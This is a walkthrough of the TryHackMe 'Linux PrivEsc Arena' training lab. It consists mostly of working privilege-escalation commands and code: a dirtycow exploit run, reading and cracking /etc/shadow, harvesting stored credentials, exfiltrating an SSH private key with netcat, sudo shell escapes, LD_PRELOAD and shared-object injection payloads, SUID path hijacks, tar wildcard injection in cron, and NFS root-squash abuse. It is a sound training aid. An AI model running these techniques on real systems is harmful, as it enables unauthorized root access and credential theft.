# Linux PrivEsc Arena

**Room Link:** [https://tryhackme.com/room/linuxprivescarena](https://tryhackme.com/room/linuxprivescarena)



## Privilege Escalation - Kernel Exploits

In command prompt type:&#x20;

**Victim**

```
/home/user/tools/linux-exploit-suggester/linux-exploit-suggester.sh
```

From the output, notice that the OS is vulnerable to “dirtycow”.

<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Exploitation

Linux VM

In command prompt type:&#x20;

**Victim**

```
gcc -pthread /home/user/tools/dirtycow/c0w.c -o c0w
```

In command prompt type:&#x20;

**Victim**

```
./c0w
```

Disclaimer: This part takes 1-2 minutes - Please allow it some time to work.

In command prompt type:&#x20;

**Victim**

```
passwd
```

In command prompt type:&#x20;

**Victim**

```
id
```

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

From here, either copy /tmp/passwd back to /usr/bin/passwd or reset your machine to undo changes made to the passwd binary

**Victim**

```
ls -lah /usr/bin/passwd 
rm -f /usr/bin/passwd   
cp /tmp/bak /usr/bin/passwd 
ls -lah /usr/bin/passwd 
```

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation - Stored Passwords (Config Files)

From the output, make note of the value of the “auth-user-pass” directive.&#x20;

**Victim**

```
cat /home/user/myvpn.ovpn
```

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

From the output, make note of the clear-text credentials.&#x20;

**Victim**

```
cat /etc/openvpn/auth.txt 
```

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

From the output, make note of the clear-text credentials.

**Victim**

```
cat /home/user/.irssi/config | grep -i passw 
```

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation - Stored Passwords (History)

**Victim**

```
cat ~/.bash_history | grep -i passw 
```

From the output, make note of the clear-text credentials.

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation - Weak File Permissions

**Victim**

```
cat /etc/passwd
```

Save the output to a file on your attacker machine

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
cat /etc/shadow
```

Save the output to a file on your attacker machine

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
unshadow passwd shadow > unshadowed.txt
hashcat -m 1800 unshadowed.txt rockyou.txt -O
```

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation - SSH Keys

Found nothing for this box

**Victim**

```
find / -name authorized_keys 2> /dev/null
```

**Victim**

```
find / -name id_rsa 2> /dev/null
cat /backups/supersecretkeys/id_rsa
```

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



#### Netcat

**Kali(receiving)**

```
nc -l -p 1234 > id_rsa
```

**Victim(sending)**

```
nc -w 3 $KALI 1234 < id_rsa
```

**Kali**

```
chmod 400 id_rsa
ssh -i id_rsa root@$VICTIM
```

## Privilege Escalation - Sudo (Shell Escaping)



**Victim**

```
 sudo -l
```

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



**Victim**

```
sudo find /bin -name nano -exec /bin/sh \;
```

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
sudo awk 'BEGIN {system("/bin/sh")}'
```

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse
```

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
sudo vim -c '!sh'
```

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation - Sudo (Abusing Intended Functionality)

**Victim**

```
 sudo -l
```

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
 sudo apache2 -f /etc/shadow
```

<figure><img src="../../.gitbook/assets/image (853).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
 john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
 john hash.txt --show
```

<figure><img src="../../.gitbook/assets/image (854).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation - Sudo (LD\_PRELOAD)

**Victim**

```
 sudo -l
```

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**exploit.c**

```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

**Victim**

```
gcc -fPIC -shared -o /tmp/exploit.so exploit.c -nostartfiles
sudo LD_PRELOAD=/tmp/exploit.so apache2
```

<figure><img src="../../.gitbook/assets/image (855).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation - SUID (Shared Object Injection)



**Victim**

```
find / -type f -perm -04000 -ls 2>/dev/null
```

<figure><img src="../../.gitbook/assets/image (856).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
```

<figure><img src="../../.gitbook/assets/image (857).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
mkdir /home/user/.config
cd /home/user/.config
vi libcalc.c
```

**libcalc.c**

```
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

**Victim**

```
gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
/usr/local/bin/suid-so
```

<figure><img src="../../.gitbook/assets/image (858).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation - SUID (Symlinks)

**Victim #1**

```
 dpkg -l | grep nginx
```

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Victim #1**

```
su -l www-data
```

**Victim #1**

```
/home/user/tools/nginx/nginxed-root.sh /var/log/nginx/error.log
```

**Victim #2**

```
invoke-rc.d nginx rotate >/dev/null 2>&1
```

**Victim #1**

```
id
```

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation - SUID (Environment Variables #1)

### Detection

**Victim**

```
find / -type f -perm -04000 -ls 2>/dev/null
```

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
strings /usr/local/bin/suid-env
```

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Exploitation

**Victim**

```
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
```



**Victim**

```
gcc /tmp/service.c -o /tmp/service
export PATH=/tmp:$PATH
/usr/local/bin/suid-env
```

**Victim**

```
id
```

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation - SUID (Environment Variables #2)

### Detection

**Victim**

```
find / -type f -perm -04000 -ls 2>/dev/null
```

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
/usr/local/bin/suid-env2
```

### Exploitation Method #1

**Victim**

```
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
```

**Victim**

```
export -f /usr/sbin/service
```

**Victim**

```
/usr/local/bin/suid-env2
```

### Exploitation Method #2

**Victim**

```
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/bash -p'
```

## Privilege Escalation - Capabilities

**Victim**

```
getcap -r / 2>/dev/null
```

<figure><img src="../../.gitbook/assets/image (12) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation - Cron (Path)

### Detection

**Victim**

```
cat /etc/crontab
```

<figure><img src="../../.gitbook/assets/image (11) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Exploitation

**Victim**

```
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
chmod +x /home/user/overwrite.sh
```

Wait 1 minute for the Bash script to execute.

**Victim**

```
/tmp/bash -p
id
```

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation - Cron (Wildcards)

### Detection

From the output, notice the script “/usr/local/bin/compress.sh”

**Victim**

```
cat /etc/crontab
```

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
cat /usr/local/bin/compress.sh
```

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Exploitation

**Victim**

```
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh
```

**Victim**

```
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=sh\ runme.sh
```



**Victim**

```
/tmp/bash -p
id
```

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation - Cron (File Overwrite)

### Detection

From the output, notice the script “overwrite.sh”

**Victim**

```
cat /etc/crontab
```

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

From the output, notice the file permissions.

**Victim**

```
ls -l /usr/local/bin/overwrite.sh
```

<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Exploitation

**Victim**

```
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh
```

Wait 1 minute for the Bash script to execute.

**Victim**

```
/tmp/bash -p
id
```

## Privilege Escalation - NFS Root Squashing

### Detection

From the output, notice that “no\_root\_squash” option is defined for the “/tmp” export.

**Victim**

```
cat /etc/exports
```

<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Exploitation

**Kali**

```
showmount -e $VICTIM
```

<figure><img src="../../.gitbook/assets/image (10) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
mkdir /tmp/1
mount -o rw,vers=2 10.10.26.171:/tmp /tmp/1
```

**Kali**

```
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/1/x.c
```

**Kali**

```
gcc /tmp/1/x.c -o /tmp/1/x
chmod +s /tmp/1/x
```

**Victim**

```
/tmp/x
id
```

<figure><img src="../../.gitbook/assets/image (11) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
